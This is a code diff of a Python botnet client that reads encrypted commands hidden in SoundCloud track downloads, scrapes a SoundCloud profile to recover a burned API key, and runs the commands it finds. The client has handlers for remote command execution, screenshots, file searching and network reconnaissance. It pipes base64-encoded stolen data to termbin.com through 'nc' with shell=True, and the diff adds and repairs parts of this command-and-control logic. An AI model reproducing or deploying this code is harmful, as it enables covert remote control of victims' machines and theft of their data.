@@ -20,18 +20,18 @@ __IV__ = "DADE575D41C4EDAFE55798C7B869C6E2"
 
 def encrypt(string):
 #Aes256-cbc
+    return None
 
 def decrypt(string):
+    return None
 
-
-class Bot:
+class Bot():
     def __init__(self):
         self.apiKey = "1031bab2ce2395cb86acee82de84cec0"
         self.postData = {"UID":"", "Command":"", "XfilData":"", "Time":""}
         self.oldSongs = []
 
     #Send requests to soundcloud
-    @staticmethod
     def request(self):
         if len(self.oldSongs) > 10:
                 del self.oldSongs[10:len(self.oldSongs)]
@@ -41,14 +41,13 @@ class Bot:
 
         while 400 >= r.status_code <= 499:
             #API Key has been burned, need a new one
-            #TODO:Create soundcloud user account to look at the buy link and get the new api key!
-            #Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat
+            #Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat(Done in main)
 
-            #This will need some refining
-            r = requests.get()
-            found = r.text.find('buy')
-            #Chop off the .com and just take the api key
-            newKey = r.text[found.start():found.end()-4]
+            user = "user-447310327-528627001/"
+            r = requests.get("https://soundcloud.com/user-447310327-528627001")
+            found = r.text.find(user)
+
+            newKey = r.text[r.text.find('>',found+len(user))+1:r.text.find('<',found+len(user))]
 
             if newKey != self.apiKey:
                 self.apiKey = newKey
@@ -69,8 +68,8 @@ class Bot:
             dl_url = webjson[song_num]['download_url'] + "?client_id=" + self.apiKey
             dl_array.append(dl_url)
 
+
         enc_command_array = []
-        command_array = []
         for song in dl_array:
             r = requests.get(song)
             it = re.finditer('(00[2-7][0-9a-f]){8,}',r.text)
@@ -81,9 +80,18 @@ class Bot:
 
         #Do command validation here
         plaintext = []
-        for command in enc_command_array:
-            plaintext.append(decrypt(base64.b64decode(command)))
+        #TODO: Remove the following lines
+        for i in enc_command_array:
+            print "command: " + str(i)
 
+        """
+        for command in enc_command_array:
+            try:
+                plaintext.append(decrypt(base64.b64decode(command)))
+            except Exception:
+                continue
+        """
+        command_array = []
         for index in xrange(len(plaintext)):
             if plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or \
                 plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":
@@ -95,7 +103,6 @@ class Bot:
 
 
     #Post data to termbin
-    @staticmethod
     def post_data(self):
         self.postData['Time'] = time.ctime()
         encData = base64.b64encode(encrypt(str(self.postData)))
@@ -103,31 +110,26 @@ class Bot:
         call(['echo ' + encData + ' | nc termbin.com 9999'], shell=True)
 
     #Take screenshot
-    @staticmethod
-    def take_screenshot():
-
+    def take_screenshot(self):
+        return None
 
     #Search each file on the system for a specific string
-    @staticmethod
     def search_string(self, string):
-
+        return None
 
     #Get networking information
-    @staticmethod
     def net_info(self):
         self.postData['Command'] = 'net_info'
         self.postData['XfilData'] = check_output(['ifconfig'])
 
 
     #Execute commands locally
-    @staticmethod
     def rce_linux(self, command):
         self.postData['Command'] = 'rce_linux:' + command
         self.postData['XfilData'] = check_output([command])
 
 
     #Querry website for continuous integration
-    @staticmethod
     def pull_resource(self, info):
         self.postData['Command'] = 'pull_resource'
         r = requests.get(info)
@@ -151,7 +153,8 @@ if __name__ == "__main__":
         count = 0
         for item in command:
             #Might need to change this, depends if the command or the arguments are first
-            if count % 2 == 0:
+            if count % 2 == 1:
+                count+=1
                 continue
 
             if item == 'take_screenshot':
@@ -176,5 +179,6 @@ if __name__ == "__main__":
             elif item == 'pull_resource':
                 bender.pull_resource(command[count+1])
 
+            count+=1
         #Make random between 2-5hrs
         time.sleep(60 * 60 * 3)
